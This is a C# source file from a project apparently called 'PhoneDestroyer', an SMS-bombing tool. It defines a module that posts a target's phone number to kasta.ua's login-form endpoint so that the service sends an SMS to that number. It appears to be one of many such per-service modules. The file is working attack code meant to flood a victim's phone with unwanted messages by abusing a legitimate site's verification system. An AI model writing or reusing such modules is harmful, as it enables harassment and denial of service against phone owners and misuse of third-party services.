using PhoneDestroyer.Utility;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PhoneDestroyer.Services.UA;

internal class Kasta : Service
{
    public override string Name => "Kasta";

    public override CountryCodes AvailableFor => CountryCodes.UA;

    public override async Task<bool> SendSmsAsync()
    {
        var resp = await Client.PostAsync("https://kasta.ua/api/v2/ssr/login-form",
            new FormUrlEncodedContent(new List<KeyValuePair<string, string>>()
            {
                new KeyValuePair<string,string>("layout", "poe"),
                new KeyValuePair<string,string>("email", $"{(int)CountryCodes.UA}{PhoneNumber}"),
            }));
        if (LogDebug)
            Logger.LogDebug(await resp.Content.ReadAsStringAsync());
        return resp.IsSuccessStatusCode;

    }
}
